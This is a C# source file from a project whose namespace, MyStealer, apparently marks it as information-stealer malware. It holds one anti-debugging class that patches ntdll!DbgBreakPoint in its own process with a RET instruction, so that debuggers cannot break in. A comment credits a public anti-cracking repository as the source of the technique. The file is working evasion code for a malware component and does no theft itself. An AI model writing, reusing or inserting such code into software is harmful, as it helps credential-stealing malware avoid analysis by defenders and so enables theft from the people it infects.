using System.Diagnostics;
using static MyStealer.AntiDebug.Win32Calls;

namespace MyStealer.AntiDebug.Prevention
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
    /// </summary>
    public class AntiDbgBreakPoint : CheckBase
    {
        public override string Name => "Neutralize ntdll!DbgBreakPoint";

        public override bool PreventPassive()
        {
            var ntdll = GetModuleHandle("ntdll");
            var proc = GetProcAddress(ntdll, "DbgBreakPoint");
            var instr = new byte[] { 0xC3 }; // RET
            return WriteProcessMemory(Process.GetCurrentProcess().SafeHandle, proc, instr, 1, 0);
        }
    }
}
